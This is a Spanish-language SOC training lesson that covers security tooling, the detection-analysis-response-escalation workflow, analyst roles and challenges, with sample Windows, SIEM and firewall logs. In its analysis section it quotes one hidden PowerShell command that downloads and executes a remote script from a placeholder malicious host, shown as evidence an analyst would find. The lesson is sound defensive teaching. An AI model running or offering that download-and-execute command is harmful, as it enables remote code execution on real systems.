# Día 1: Conceptos SOC

---

[Inicio](../README.md) | [Día 2: Windows Server & Active Directory ⟶](./02-Windows_AD.md)

# Conceptos Fundamentales de un SOC

## 1. ¿Qué es un SOC y por qué existe?
Un **SOC (Security Operations Center)** es un centro especializado en **monitorear, detectar, analizar y responder a amenazas de ciberseguridad**.  
Su función es garantizar que la información y los sistemas de una organización se mantengan **seguros, disponibles y confiables**, frente a un panorama de amenazas que cambia constantemente.  

🔎 **Analogía**: imagina un hospital. El área de urgencias recibe pacientes (alertas), evalúa la gravedad (análisis), estabiliza al paciente (respuesta) y si es necesario lo pasa a un especialista (escalamiento). El SOC funciona igual, pero con incidentes de ciberseguridad.  

Un SOC combina **tres elementos esenciales**:
1. **Personas** → analistas de seguridad, ingenieros, líderes de respuesta.  
2. **Procesos** → flujos de trabajo, playbooks, metodologías de respuesta.  
3. **Tecnología** → 
   - **SIEM (Security Information and Event Management):** Plataforma que centraliza, correlaciona y analiza grandes volúmenes de logs y eventos de seguridad. Permite detectar patrones sospechosos, generar alertas y facilitar la investigación de incidentes. Ejemplos: Splunk, Wazuh, IBM QRadar.

     | Producto         | Plataforma         | ¿Gratuito? | Características Especiales |
     |------------------|-------------------|------------|---------------------------|
     | Splunk           | Windows, Linux    | No         | Potente correlación, dashboards avanzados, escalabilidad empresarial. |
     | Wazuh            | Windows, Linux, macOS | Sí        | Open source, integración con ELK, monitoreo de integridad, reglas personalizables. |
     | IBM QRadar       | Windows, Linux    | No         | Integración con IA, análisis de comportamiento, soporte empresarial. |

   - **EDR (Endpoint Detection and Response):** Solución enfocada en la protección y monitoreo de endpoints (PCs, servidores). Detecta comportamientos anómalos, bloquea amenazas y permite responder rápidamente ante incidentes en dispositivos finales. Ejemplos: CrowdStrike, SentinelOne, Microsoft Defender ATP.

     | Producto                      | Plataforma         | ¿Gratuito? | Características Especiales |
     |-------------------------------|-------------------|------------|---------------------------|
     | CrowdStrike Falcon            | Windows, macOS, Linux | No         | Protección en la nube, hunting de amenazas, respuesta automatizada, análisis forense. |
     | SentinelOne                   | Windows, macOS, Linux | No         | Detección autónoma, rollback de ransomware, protección offline, IA avanzada. |
     | Microsoft Defender ATP        | Windows, macOS, Linux, Android, iOS | Parcialmente | Integración nativa con Windows, protección en tiempo real, gestión centralizada, análisis de vulnerabilidades. |

   - **IDS/IPS (Intrusion Detection/Prevention System):** Herramientas que analizan el tráfico de red para identificar (IDS) y bloquear (IPS) actividades maliciosas o no autorizadas. Ayudan a prevenir ataques como escaneo de puertos, exploits y movimientos laterales. Ejemplos: Snort, Suricata, Cisco Firepower.

     | Producto         | Plataforma         | ¿Gratuito? | Características Especiales |
     |------------------|-------------------|------------|---------------------------|
     | Snort            | Windows, Linux    | Sí         | Open source, reglas personalizables, gran comunidad. |
     | Suricata         | Windows, Linux, macOS | Sí        | Detección multicapa, alto rendimiento, soporte para IDS/IPS y NSM. |
     | Cisco Firepower  | Hardware, Linux   | No         | Integración con Cisco, protección avanzada, gestión centralizada. |

   - **Firewalls:** Dispositivos o software que controlan el tráfico de red entre diferentes zonas, permitiendo o bloqueando conexiones según reglas definidas. Son la primera línea de defensa para evitar accesos no autorizados.

     | Producto         | Plataforma         | ¿Gratuito? | Características Especiales |
     |------------------|-------------------|------------|---------------------------|
     | pfSense          | Hardware, Software | Sí         | Open source, interfaz web, reglas avanzadas, VPN integrada. |
     | Fortinet         | Hardware, Software | No         | Alta performance, filtrado web, protección contra amenazas avanzadas. |
     | Cisco ASA        | Hardware, Software | No         | Integración empresarial, VPN, gestión centralizada. |

   - **Honeypots:** Sistemas diseñados para simular vulnerabilidades y atraer a atacantes. Permiten estudiar técnicas de ataque y obtener inteligencia sobre amenazas, sin poner en riesgo los sistemas reales. Ejemplos: Cowrie, Honeyd, Canary.

     | Producto         | Plataforma         | ¿Gratuito? | Características Especiales |
     |------------------|-------------------|------------|---------------------------|
     | Cowrie           | Linux             | Sí         | Simulación de SSH y Telnet, registro detallado de ataques. |
     | Honeyd           | Linux, Windows    | Sí        | Simulación de múltiples servicios, personalización avanzada. |
     | Canary           | Hardware, Software | No         | Fácil despliegue, alertas automáticas, integración con SIEM. |

   - **Threat Intelligence:** Conjunto de información sobre amenazas actuales (tácticas, técnicas, indicadores de compromiso) que ayuda a anticipar y defenderse de ataques. Se obtiene de fuentes internas y externas, y se utiliza para mejorar la detección y respuesta en el SOC. Ejemplos: MISP, Recorded Future, IBM X-Force.

     | Producto         | Plataforma         | ¿Gratuito? | Características Especiales |
     |------------------|-------------------|------------|---------------------------|
     | MISP             | Linux             | Sí         | Open source, intercambio colaborativo, integración con SIEM. |
     | Recorded Future  | Web, API          | No         | Análisis predictivo, inteligencia automatizada, gran base de datos. |
     | IBM X-Force      | Web, API          | No         | Inteligencia global, integración con QRadar, reportes detallados. |

---

## 2. Funciones principales de un SOC
Las tareas de un SOC no son solo “ver alertas en pantalla”. Sus funciones abarcan un ciclo completo:

- **Monitoreo continuo (24/7):** vigilar logs, tráfico y sistemas para detectar anomalías.  
- **Gestión de incidentes:** manejar eventos sospechosos, desde su detección hasta la resolución.  
- **Gestión de vulnerabilidades:** identificar fallos en sistemas y coordinar parches o mitigaciones.  
- **Cumplimiento normativo:** mantener registros y evidencias para auditorías (ej. ISO 27001, GDPR, NIST).  
- **Inteligencia de amenazas (Threat Intelligence):** conocer nuevas tácticas de adversarios y ajustar defensas.  
- **Forensia digital:** analizar sistemas comprometidos para entender cómo ocurrió el ataque.  

👉 Esto convierte al SOC en la “torre de control” de la seguridad informática de una empresa.

---

## 3. Los 4 Pilares del SOC

### 🔹 3.1 Detección
- Es el primer paso: **saber que algo anómalo está ocurriendo**.  
- Se logra recolectando y correlacionando datos de múltiples fuentes:  
  - **Logs de sistemas y aplicaciones** (Windows Event Logs, /var/log en Linux).  
  - **Herramientas de monitoreo de red** (IDS/IPS como Suricata, Snort).  
  - **Alertas de seguridad en endpoints** (EDR como CrowdStrike, Defender ATP).  
  - **Eventos de autenticación y privilegios** (Active Directory, bases de datos).  
- La detección moderna usa **SIEM** (ej. Splunk, Wazuh) para correlacionar datos y reducir ruido.  

📌 Ejemplo:  
Un analista recibe una alerta en el SIEM indicando que un usuario administrativo ha iniciado sesión fuera del horario laboral desde una IP geolocalizada en otro país. Al revisar los logs, se observa que el usuario nunca había accedido desde esa ubicación y, además, se detectan múltiples intentos fallidos previos. Esto sugiere un posible compromiso de credenciales y se genera una alerta de seguridad para investigar el incidente.

```text
Windows Event Log:
4624 - An account was successfully logged on.
   Subject: Security ID: S-1-5-21-...
   Account Name: admin_user
   Logon Type: 10
   Workstation Name: SERVER01
   Source Network Address: 185.23.45.67
   Logon Time: 2025-09-13 02:14:22
```

```text
SIEM alerta correlacionada:
[ALERTA] Inicio de sesión administrativo fuera de horario laboral
Usuario: admin_user
IP: 185.23.45.67 (Ubicación: Rusia)
Hora: 02:14
Intentos fallidos previos: 8
```

---

### 🔹 3.2 Análisis
- Una vez detectada la alerta, un **analista la investiga**.  
- Objetivo: **determinar si es un falso positivo o un incidente real**.  
- Actividades comunes:  
  - Revisar la IP origen → ¿es interna, externa, de un país sospechoso?  
  - Comparar el comportamiento actual del usuario con el histórico.  
  - Revisar procesos en el host afectado.  
  - Consultar inteligencia de amenazas para confirmar si un hash/IP está en listas negras.  
- Aquí se necesitan habilidades **técnicas + analíticas**: no basta con leer la alerta, hay que correlacionar datos.

📌 Ejemplo:  
El analista investiga la alerta anterior y descubre que la IP está asociada a un servicio VPN público frecuentemente usado por atacantes. Al revisar el endpoint, detecta un proceso sospechoso ejecutándose con privilegios elevados y un archivo descargado recientemente que coincide con un hash reportado en listas negras de threat intelligence. Se confirma que el incidente es real y se inicia el proceso de respuesta.

```text
Proceso sospechoso en el endpoint:
C:\Windows\System32\cmd.exe /c powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://malicious-site.com/payload.ps1')"
```

```text
Threat Intelligence:
Hash detectado: 8f14e45fceea167a5a36dedd4bea2543
Estado: Listado en VirusTotal y MISP como malware conocido
```

---

### 🔹 3.3 Respuesta
- Confirmada la amenaza, el SOC actúa. El objetivo es **contener y mitigar el incidente**.  
- Acciones típicas:  
  - Bloquear direcciones IP en firewalls.  
  - Aislar un endpoint de la red.  
  - Revocar credenciales comprometidas.  
  - Aplicar parches de seguridad.  
- La respuesta debe ser **rápida y estandarizada**, por eso los SOC trabajan con **playbooks** que indican paso a paso cómo actuar frente a cada tipo de incidente.  

📌 Ejemplo:  
El analista sigue el playbook de respuesta para compromisos de credenciales: aísla el equipo afectado de la red, revoca las credenciales del usuario, bloquea la IP sospechosa en el firewall y notifica al usuario y al equipo de TI. Se inicia un escaneo de malware en el endpoint y se recopilan evidencias para el análisis forense.

```text
Firewall log:
2025-09-13 02:20:01 BLOCK src=185.23.45.67 dst=192.168.1.10 port=3389 rule="Bloqueo IP sospechosa"
```

```text
EDR acción:
[ACCION] Endpoint SERVER01 aislado de la red
[ACCION] Credenciales de admin_user revocadas
```

---

### 🔹 3.4 Escalamiento
- No todos los incidentes los resuelve un analista de nivel básico.  
- Si el incidente supera su alcance, se **escala** a un nivel superior (N2, N3 o CSIRT).  
- Escalar puede significar:  
  - Dar visibilidad al equipo de forensia.  
  - Informar al CISO y alta dirección si es crítico.  
  - Coordinar con áreas legales o de cumplimiento si hubo fuga de datos.  

📌 Ejemplo:  
Durante el análisis forense, se descubre que el atacante logró moverse lateralmente y acceder a servidores con información confidencial. El incidente se escala al equipo N3 y al CSIRT, quienes coordinan la comunicación con la alta dirección, el área legal y gestionan la notificación a las autoridades regulatorias. Se inicia un plan de recuperación y comunicación interna para mitigar el impacto y evitar futuras brechas.

```text
Forensic log:
2025-09-13 03:10:45 LATERAL MOVEMENT detected: admin_user accessed SERVER02, SERVER03
2025-09-13 03:12:10 Sensitive file accessed: /srv/finance/payroll.xlsx
```

```text
CSIRT comunicación:
[NOTIFICACION] Incidente crítico reportado a CISO y área legal
[ACCION] Coordinación con autoridades regulatorias iniciada
```

---

## 4. Roles dentro de un SOC
Un SOC está estructurado por niveles de analistas y equipos especializados, cada uno con funciones y responsabilidades específicas:

- **Nivel 1 (N1):**  
  - Primera línea de defensa.  
  - Monitorean alertas y hacen triage básico.  
  - Distinguen entre falsos positivos y casos reales.  
  - Documentan incidentes y escalan los casos complejos.  
  - **Habilidades clave:** Conocimiento básico de ciberseguridad, manejo de SIEM, atención al detalle, capacidad de seguir procedimientos.  
  - **Ejemplo de tarea:** Revisar una alerta de login sospechoso y determinar si requiere investigación adicional o puede descartarse como falso positivo.

- **Nivel 2 (N2):**  
  - Analistas más experimentados.  
  - Investigan incidentes confirmados y realizan análisis más profundos.  
  - Realizan hunting de amenazas, correlación avanzada de eventos y análisis de malware básico.  
  - Proponen mejoras en reglas de detección y procedimientos.  
  - **Habilidades clave:** Análisis forense básico, manejo avanzado de herramientas de seguridad, pensamiento crítico, capacidad de investigación.  
  - **Ejemplo de tarea:** Analizar un archivo sospechoso detectado en un endpoint, realizar sandboxing y determinar si es malware.

- **Nivel 3 (N3) / Ingenieros SOC:**  
  - Expertos senior.  
  - Manejan incidentes críticos, hacen análisis forense avanzado y reverse engineering de malware.  
  - Diseñan reglas avanzadas en SIEM y EDR, automatizan procesos y lideran la respuesta ante crisis.  
  - Asesoran en la integración de nuevas tecnologías y en la formación de analistas.  
  - **Habilidades clave:** Análisis forense avanzado, desarrollo de scripts, liderazgo técnico, gestión de crisis.  
  - **Ejemplo de tarea:** Investigar un ataque de ransomware, identificar el vector de entrada, recuperar evidencias y coordinar la remediación.

- **CSIRT (Computer Security Incident Response Team):**  
  - Equipo especializado que actúa en incidentes graves y de alto impacto.  
  - Puede incluir áreas legales, comunicación y dirección.  
  - Gestiona la coordinación con autoridades externas, comunicación interna y externa, y el cumplimiento normativo.  
  - Lidera la gestión de crisis y la recuperación tras incidentes mayores.  
  - **Habilidades clave:** Gestión de incidentes, comunicación efectiva, conocimiento legal y normativo, liderazgo en situaciones críticas.  
  - **Ejemplo de tarea:** Coordinar la respuesta ante una fuga de datos masiva, gestionar la comunicación con clientes y autoridades regulatorias, y liderar el plan de recuperación.

Cada rol es fundamental para el funcionamiento del SOC y requiere formación continua, trabajo en equipo y adaptación a nuevas amenazas y tecnologías.

---

## 5. Ejemplo Real de Flujo de Trabajo en un SOC
A continuación se muestra un flujo de trabajo típico en un SOC, con ejemplos realistas y fragmentos de logs:

1. **Alerta inicial:** el SIEM detecta múltiples intentos fallidos de login en un servidor.

```text
SIEM alerta:
[ALERTA] Múltiples intentos fallidos de login detectados
Servidor: WEB01
Usuario: juan.perez
IP origen: 201.45.67.89
Hora: 03:12
Intentos fallidos: 12
```

2. **Análisis N1:** revisa logs y confirma actividad sospechosa.

```text
Windows Event Log:
4625 - An account failed to log on.
   Account Name: juan.perez
   Workstation Name: WEB01
   Source Network Address: 201.45.67.89
   Failure Reason: Unknown user name or bad password
   Logon Time: 2025-09-13 03:12:10
```

El analista N1 verifica que los intentos provienen de una IP externa y que el usuario no suele iniciar sesión a esa hora. Escala el caso a N2.

3. **Respuesta inmediata:** bloquea la IP y alerta al usuario.

```text
Firewall log:
2025-09-13 03:15:01 BLOCK src=201.45.67.89 dst=10.0.0.5 port=443 rule="Bloqueo por intentos de login sospechosos"
```

El analista N2 contacta al usuario para confirmar si los intentos fueron legítimos. El usuario confirma que no intentó acceder.

4. **Escalamiento N2:** descubre que sí hubo un login exitoso posterior → posible compromiso.

```text
Windows Event Log:
4624 - An account was successfully logged on.
   Account Name: juan.perez
   Logon Type: 10
   Source Network Address: 201.45.67.89
   Logon Time: 2025-09-13 03:16:22
```

El analista N2 detecta que, tras los intentos fallidos, hubo un acceso exitoso desde la misma IP. Se inicia análisis forense en el endpoint.

5. **N3/CSIRT:** investigan cómo escaló privilegios, aíslan el servidor y coordinan recuperación.

```text
Forensic log:
2025-09-13 03:20:45 Privilege escalation detected: juan.perez added to Administrators group
2025-09-13 03:22:10 Sensitive file accessed: C:\Finance\Payroll.xlsx
```

```text
CSIRT acción:
[ACCION] Servidor WEB01 aislado de la red
[ACCION] Notificación a CISO y área legal
[ACCION] Coordinación de recuperación y comunicación con afectados
```

Este flujo se repite **decenas o cientos de veces al día** en un SOC, y cada paso requiere documentación, comunicación y seguimiento preciso para proteger la organización.

---

## 6. Retos y Desafíos en un SOC
El trabajo en un SOC implica enfrentar desafíos técnicos, humanos y organizacionales que requieren adaptación constante y mejora continua:

- **Volumen de alertas:** Un SOC recibe miles de eventos diarios, lo que puede generar "alert fatigue" (fatiga por alertas). Los analistas deben priorizar y filtrar las alertas relevantes para evitar que amenazas reales pasen desapercibidas.
  - *Ejemplo:* Un SIEM genera 5,000 alertas en un día, pero solo 50 requieren investigación profunda. El uso de reglas de correlación y automatización ayuda a reducir el ruido.

- **Falsos positivos:** Muchas alertas no corresponden a amenazas reales, lo que puede consumir tiempo y recursos.
  - *Ejemplo:* Un usuario olvida su contraseña y genera múltiples intentos fallidos de login, activando una alerta de posible ataque de fuerza bruta. El analista debe distinguir entre actividad legítima y maliciosa.

- **Amenazas avanzadas:** Los atacantes emplean técnicas sofisticadas como "living off the land" (uso de herramientas legítimas del sistema) y ataques sin malware, dificultando la detección.
  - *Ejemplo:* Un atacante utiliza PowerShell para moverse lateralmente en la red sin instalar software malicioso, evadiendo los antivirus tradicionales.

- **Necesidad de automatización:** El uso de SOAR (Security Orchestration, Automation and Response) permite automatizar respuestas y tareas repetitivas, acelerando la reacción ante incidentes y liberando a los analistas para tareas más complejas.
  - *Ejemplo:* Un playbook automatizado bloquea una IP sospechosa y aísla un endpoint en segundos tras detectar actividad maliciosa.

- **Escasez de talento:** Hay alta demanda de analistas SOC capacitados, lo que obliga a invertir en formación continua y retención de personal.
  - *Ejemplo:* Un SOC implementa programas de capacitación interna y simulacros de incidentes para mejorar las habilidades del equipo.

- **Presión y estrés:** El ambiente de trabajo puede ser intenso, especialmente durante incidentes críticos o ataques en curso. La gestión emocional y el trabajo en equipo son fundamentales.
  - *Ejemplo:* Durante un ataque de ransomware, los analistas deben coordinarse bajo presión para contener el incidente y minimizar el impacto.

- **Cumplimiento normativo y auditorías:** El SOC debe mantener registros detallados y cumplir con normativas como ISO 27001, GDPR o NIST, lo que implica procesos de documentación y auditoría constantes.
  - *Ejemplo:* Preparar evidencias y reportes para una auditoría externa, asegurando que todos los incidentes estén correctamente documentados.

Abordar estos retos requiere una combinación de tecnología, procesos eficientes, formación continua y una cultura de colaboración y resiliencia dentro del equipo SOC.

---

## 7. Conexión con tu rol como Analista SOC
Como futuro analista SOC, tu día a día será dinámico y exigente, combinando tareas técnicas, análisis crítico y comunicación constante:

- **Monitorear alertas en SIEM/EDR:** Revisar continuamente las alertas generadas por las herramientas de seguridad, identificar patrones sospechosos y priorizar los incidentes más críticos.
  - *Ejemplo:* Recibes una alerta de acceso remoto fuera de horario laboral. Analizas el log, verificas la IP y decides si es legítimo o requiere investigación.

- **Hacer triage rápido:** Clasificar las alertas según su gravedad y urgencia, descartando falsos positivos y enfocando los recursos en incidentes reales.
  - *Ejemplo:* De 100 alertas recibidas en una hora, solo 3 muestran actividad anómala que requiere análisis profundo.

- **Escalar cuando sea necesario:** Si el incidente supera tu nivel de acceso o conocimiento, lo escalas a analistas de nivel superior o al CSIRT, siguiendo los protocolos establecidos.
  - *Ejemplo:* Detectas un posible movimiento lateral en la red y lo reportas al equipo N2/N3 para análisis forense avanzado.

- **Documentar incidentes:** Registrar cada paso del proceso de investigación y respuesta, asegurando que toda la información relevante quede disponible para auditorías y aprendizaje futuro.
  - *Ejemplo:* Documentas la cronología de un ataque de phishing, las acciones tomadas y las evidencias recolectadas.

- **Aprender continuamente nuevas tácticas de ataque y defensa:** Mantenerse actualizado sobre las últimas amenazas, técnicas de ataque y herramientas defensivas mediante cursos, simulacros y autoestudio.
  - *Ejemplo:* Participas en simulacros de respuesta a incidentes, revisas reportes de threat intelligence y pruebas nuevas herramientas de análisis.

- **Comunicación y trabajo en equipo:** Colaborar con otros analistas, ingenieros y áreas de la empresa para coordinar respuestas y compartir conocimiento.
  - *Ejemplo:* Informas a TI sobre la necesidad de aplicar parches, colaboras con el área legal en la gestión de una fuga de datos.

- **Desarrollo profesional:** Buscar certificaciones (ej. CompTIA Security+, CEH, GCIA), participar en comunidades de ciberseguridad y practicar en laboratorios virtuales para mejorar tus habilidades.

Ser analista SOC implica atención al detalle, pensamiento crítico, disciplina en la documentación y capacidad para trabajar bajo presión. Es un rol clave en la defensa de la organización y una excelente oportunidad para crecer en el campo de la ciberseguridad.

---

✅ **Conclusión del Día 1:**  
Un SOC es mucho más que un centro de monitoreo; representa un ecosistema integrado de personas, procesos y tecnología, donde la colaboración y la especialización son clave para la defensa de la organización. Los pilares de detección, análisis, respuesta y escalamiento estructuran el trabajo diario y permiten enfrentar un entorno de amenazas en constante evolución. Comprender la organización de los roles y los desafíos operativos es fundamental para desempeñarse con éxito y contribuir a la seguridad de la empresa de manera efectiva y profesional.
